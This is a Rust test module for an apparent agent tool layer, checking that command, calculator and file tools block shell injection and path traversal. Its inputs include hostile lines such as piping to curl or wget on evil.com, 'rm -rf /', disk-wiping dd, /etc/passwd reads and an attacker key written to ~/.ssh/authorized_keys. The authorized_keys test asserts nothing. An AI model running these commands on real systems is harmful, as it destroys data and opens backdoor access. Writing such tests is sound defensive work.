#[cfg(test)]
mod security_tests {
    use crate::tools::safe_commands::SafeCommand;
    use crate::tools::commands::{execute_tool_command, calculate_tool, read_file_tool, write_file_tool, append_to_file_tool, tail_file_tool};
    use crate::security::path_validator::PathValidator;
    use std::path::{Path, PathBuf};
    use std::env;
    use std::fs::{self, File};
    use std::io::Write;

    // ===== Command Injection Tests =====

    #[tokio::test]
    async fn test_blocks_semicolon_command_chaining() {
        let result = execute_tool_command(
            "ls; rm -rf /tmp/test".to_string(),
            None
        ).await;
        
        assert!(result.is_err(), "Should reject command with semicolon");
        assert!(result.unwrap_err().contains("metacharacters"));
    }

    #[tokio::test]
    async fn test_blocks_pipe_command_chaining() {
        let result = execute_tool_command(
            "ls | curl http://evil.com".to_string(),
            None
        ).await;
        
        assert!(result.is_err(), "Should reject command with pipe");
        assert!(result.unwrap_err().contains("metacharacters"));
    }

    #[tokio::test]
    async fn test_blocks_and_command_chaining() {
        let result = execute_tool_command(
            "ls && echo malicious".to_string(),
            None
        ).await;
        
        assert!(result.is_err(), "Should reject command with &&");
        assert!(result.unwrap_err().contains("metacharacters"));
    }

    #[tokio::test]
    async fn test_blocks_backtick_substitution() {
        let result = execute_tool_command(
            "echo `whoami`".to_string(),
            None
        ).await;
        
        assert!(result.is_err(), "Should reject command with backticks");
        assert!(result.unwrap_err().contains("metacharacters"));
    }

    #[tokio::test]
    async fn test_blocks_dollar_substitution() {
        let result = execute_tool_command(
            "echo $(whoami)".to_string(),
            None
        ).await;
        
        assert!(result.is_err(), "Should reject command with $()");
        assert!(result.unwrap_err().contains("metacharacters"));
    }

    #[tokio::test]
    async fn test_blocks_output_redirection() {
        let result = execute_tool_command(
            "ls > /tmp/output.txt".to_string(),
            None
        ).await;
        
        assert!(result.is_err(), "Should reject command with output redirection");
        assert!(result.unwrap_err().contains("metacharacters"));
    }

    #[tokio::test]
    async fn test_blocks_input_redirection() {
        let result = execute_tool_command(
            "cat < /etc/passwd".to_string(),
            None
        ).await;
        
        assert!(result.is_err(), "Should reject command with input redirection");
        assert!(result.unwrap_err().contains("metacharacters"));
    }

    #[tokio::test]
    async fn test_blocks_unlisted_dangerous_commands() {
        // Test commands that should never be allowed
        let dangerous = vec![
            "rm -rf /",
            "sudo rm file.txt",
            "curl http://evil.com",
            "wget http://evil.com/malware",
            "chmod 777 /",
            "dd if=/dev/zero of=/dev/sda",
        ];

        for cmd in dangerous {
            let result = execute_tool_command(cmd.to_string(), None).await;
            assert!(result.is_err(), "Should reject dangerous command: {}", cmd);
        }
    }

    // ===== Safe Command Tests =====

    #[tokio::test]
    async fn test_allows_safe_ls() {
        let result = SafeCommand::from_string("ls -la");
        assert!(result.is_ok(), "Should allow ls -la");
    }

    #[tokio::test]
    async fn test_allows_safe_pwd() {
        let result = SafeCommand::from_string("pwd");
        assert!(result.is_ok(), "Should allow pwd");
    }

    #[tokio::test]
    async fn test_allows_safe_git_status() {
        let result = SafeCommand::from_string("git status");
        assert!(result.is_ok(), "Should allow git status");
    }

    #[tokio::test]
    async fn test_allows_safe_cat() {
        let result = SafeCommand::from_string("cat README.md");
        assert!(result.is_ok(), "Should allow cat");
    }

    #[tokio::test]
    async fn test_allows_safe_npm() {
        let result = SafeCommand::from_string("npm install");
        assert!(result.is_ok(), "Should allow npm install");
    }

    // ===== Calculate Tool Tests =====

    #[tokio::test]
    async fn test_calculate_allows_safe_math() {
        let result = calculate_tool("2 + 2".to_string()).await;
        assert!(result.is_ok(), "Should allow simple math");
    }

    #[tokio::test]
    async fn test_calculate_allows_complex_math() {
        let result = calculate_tool("(10 + 5) * 2 - 8 / 4".to_string()).await;
        assert!(result.is_ok(), "Should allow complex math expressions");
    }

    #[tokio::test]
    async fn test_calculate_blocks_shell_injection() {
        let malicious = vec![
            "2 + 2; rm -rf /",
            "2 + $(whoami)",
            "2 + `whoami`",
            "2 | curl evil.com",
        ];

        for expr in malicious {
            let result = calculate_tool(expr.to_string()).await;
            assert!(result.is_err(), "Should reject malicious expression: {}", expr);
        }
    }

    #[tokio::test]
    async fn test_calculate_blocks_invalid_chars() {
        let result = calculate_tool("2 + 2; ls".to_string()).await;
        assert!(result.is_err(), "Should reject expression with invalid characters");
    }

    // ===== Edge Cases =====

    #[tokio::test]
    async fn test_empty_command() {
        let result = execute_tool_command("".to_string(), None).await;
        assert!(result.is_err(), "Should reject empty command");
    }

    #[tokio::test]
    async fn test_whitespace_only_command() {
        let result = execute_tool_command("   ".to_string(), None).await;
        assert!(result.is_err(), "Should reject whitespace-only command");
    }

    #[tokio::test]
    async fn test_newline_injection() {
        let result = execute_tool_command("ls\nrm -rf /".to_string(), None).await;
        assert!(result.is_err(), "Should reject command with newline");
        assert!(result.unwrap_err().contains("metacharacters"));
    }

    #[tokio::test]
    async fn test_null_byte_injection() {
        let result = execute_tool_command("ls\0rm".to_string(), None).await;
        // May be rejected by string parsing or command validation
        assert!(result.is_err() || !result.unwrap().stdout.contains("rm"));
    }

    // ===== Parser Tests =====

    #[test]
    fn test_parses_ls_with_flags() {
        let cmd = SafeCommand::from_string("ls -la /tmp").unwrap();
        match cmd {
            SafeCommand::Ls { path, flags } => {
                assert_eq!(path, "/tmp");
                assert!(flags.contains(&"-la".to_string()));
            }
            _ => panic!("Expected Ls variant"),
        }
    }

    #[test]
    fn test_parses_git_status() {
        let cmd = SafeCommand::from_string("git status").unwrap();
        match cmd {
            SafeCommand::Git { .. } => {}
            _ => panic!("Expected Git variant"),
        }
    }

    #[test]
    fn test_parses_git_log_with_options() {
        let cmd = SafeCommand::from_string("git log -n 10").unwrap();
        match cmd {
            SafeCommand::Git { subcommand } => {
                match subcommand {
                    crate::tools::safe_commands::GitSubcommand::Log { max_count, .. } => {
                        assert_eq!(max_count, Some(10));
                    }
                    _ => panic!("Expected Log subcommand"),
                }
            }
            _ => panic!("Expected Git variant"),
        }
    }

    #[test]
    fn test_parses_grep_with_pattern() {
        let cmd = SafeCommand::from_string("grep TODO README.md").unwrap();
        match cmd {
            SafeCommand::Grep { pattern, file, .. } => {
                assert_eq!(pattern, "TODO");
                assert_eq!(file, Some("README.md".to_string()));
            }
            _ => panic!("Expected Grep variant"),
        }
    }

    // ===== Path Traversal Tests =====

    fn setup_test_dir() -> PathBuf {
        let test_dir = env::temp_dir().join("path_traversal_tests");
        let _ = fs::remove_dir_all(&test_dir); // Clean up any previous test
        fs::create_dir_all(&test_dir).unwrap();
        test_dir
    }

    #[tokio::test]
    async fn test_read_file_blocks_parent_traversal() {
        let result = read_file_tool(
            "../../../etc/passwd".to_string(),
            1000000
        ).await;
        
        assert!(result.is_err(), "Should reject path with ..");
        let error_msg = result.unwrap_err();
        assert!(error_msg.contains("Path traversal detected") || 
                error_msg.contains("Access denied"));
    }

    #[tokio::test]
    async fn test_read_file_blocks_absolute_path_outside_home() {
        let result = read_file_tool(
            "/etc/passwd".to_string(),
            1000000
        ).await;
        
        assert!(result.is_err(), "Should reject absolute path outside home");
        assert!(result.unwrap_err().contains("Access denied"));
    }

    #[tokio::test]
    async fn test_write_file_blocks_parent_traversal() {
        let result = write_file_tool(
            "../../../tmp/evil.txt".to_string(),
            "malicious content".to_string(),
            None
        ).await;
        
        assert!(result.is_err(), "Should reject path with ..");
        assert!(result.unwrap_err().contains("Path traversal detected"));
    }

    #[tokio::test]
    async fn test_write_file_blocks_absolute_path_outside_home() {
        let result = write_file_tool(
            "/tmp/evil.txt".to_string(),
            "malicious content".to_string(),
            None
        ).await;
        
        assert!(result.is_err(), "Should reject absolute path outside home");
        assert!(result.unwrap_err().contains("Access denied"));
    }

    #[tokio::test]
    async fn test_append_file_blocks_parent_traversal() {
        let result = append_to_file_tool(
            "../../.bashrc".to_string(),
            "evil command".to_string(),
            None
        ).await;
        
        assert!(result.is_err(), "Should reject path with ..");
        assert!(result.unwrap_err().contains("Path traversal detected"));
    }

    #[tokio::test]
    async fn test_tail_file_blocks_parent_traversal() {
        let result = tail_file_tool(
            "../../../etc/passwd".to_string(),
            10,
            None
        ).await;
        
        assert!(result.is_err(), "Should reject path with ..");
        assert!(result.unwrap_err().contains("Path traversal detected"));
    }

    #[tokio::test]
    async fn test_read_file_allows_valid_home_path() {
        // Create a test file in home directory
        let home_dir = env::var("HOME").unwrap();
        let test_file = PathBuf::from(&home_dir).join(".path_traversal_test_file");
        let mut file = File::create(&test_file).unwrap();
        file.write_all(b"test content").unwrap();
        drop(file); // Close the file
        
        let result = read_file_tool(
            test_file.to_string_lossy().to_string(),
            1000000
        ).await;
        
        // Clean up
        let _ = fs::remove_file(&test_file);
        
        assert!(result.is_ok(), "Should allow reading file in home directory");
        assert_eq!(result.unwrap(), "test content");
    }

    #[tokio::test]
    async fn test_write_file_allows_valid_home_path() {
        let home_dir = env::var("HOME").unwrap();
        let test_file = PathBuf::from(&home_dir).join(".path_traversal_test_write");
        
        let result = write_file_tool(
            test_file.to_string_lossy().to_string(),
            "test content".to_string(),
            None
        ).await;
        
        // Clean up
        let _ = fs::remove_file(&test_file);
        
        assert!(result.is_ok(), "Should allow writing file in home directory");
    }

    #[test]
    fn test_path_validator_rejects_dotdot() {
        let test_dir = setup_test_dir();
        let validator = PathValidator::new(test_dir);
        
        let result = validator.validate(Path::new("../../../etc/passwd"));
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Path traversal detected"));
    }

    #[test]
    fn test_path_validator_rejects_absolute_outside_base() {
        let test_dir = setup_test_dir();
        let validator = PathValidator::new(test_dir);
        
        let result = validator.validate(Path::new("/etc/passwd"));
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Access denied"));
    }

    #[test]
    fn test_path_validator_allows_valid_relative_path() {
        let test_dir = setup_test_dir();
        let test_file = test_dir.join("test.txt");
        File::create(&test_file).unwrap();
        
        let validator = PathValidator::new(test_dir.clone());
        
        // Change to test directory for relative path test
        let original_dir = env::current_dir().unwrap();
        env::set_current_dir(&test_dir).unwrap();
        
        let result = validator.validate(Path::new("test.txt"));
        
        // Restore directory
        env::set_current_dir(original_dir).unwrap();
        
        assert!(result.is_ok());
    }

    #[test]
    fn test_path_validator_tilde_expansion() {
        let home_dir = env::var("HOME").unwrap();
        let validator = PathValidator::new(PathBuf::from(&home_dir));
        
        // Create a test file
        let test_file = PathBuf::from(&home_dir).join(".path_validator_tilde_test");
        File::create(&test_file).unwrap();
        
        let result = validator.validate(Path::new("~/.path_validator_tilde_test"));
        
        // Clean up
        let _ = fs::remove_file(&test_file);
        
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), test_file);
    }

    #[test]
    fn test_path_validator_symlink_escape() {
        let test_dir = setup_test_dir();
        let validator = PathValidator::new(test_dir.clone());
        
        // Create a symlink pointing outside the allowed directory
        let symlink_path = test_dir.join("evil_link");
        let target_path = PathBuf::from("/etc/passwd");
        
        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;
            let _ = symlink(&target_path, &symlink_path);
            
            let result = validator.validate(&symlink_path);
            
            // Should reject because symlink resolves outside allowed base
            assert!(result.is_err());
            assert!(result.unwrap_err().contains("Access denied"));
        }
    }

    #[tokio::test]
    async fn test_hidden_traversal_in_middle() {
        let result = read_file_tool(
            "docs/../../../etc/passwd".to_string(),
            1000000
        ).await;
        
        assert!(result.is_err(), "Should reject hidden traversal in path");
        assert!(result.unwrap_err().contains("Path traversal detected"));
    }

    #[tokio::test]
    async fn test_write_to_ssh_authorized_keys() {
        let result = write_file_tool(
            "~/.ssh/authorized_keys".to_string(),
            "ssh-rsa AAAA... attacker@evil.com".to_string(),
            None
        ).await;
        
        // This test validates that even though ~/.ssh is within home,
        // the validator can handle this case. The actual behavior depends
        // on whether .ssh exists and is within the allowed base.
        // For security, we should ideally have additional checks for sensitive files.
        
        // For now, we just ensure the path validation doesn't crash
        // In production, you might want to add an explicit deny list for sensitive files
        let _ = result;
    }
}
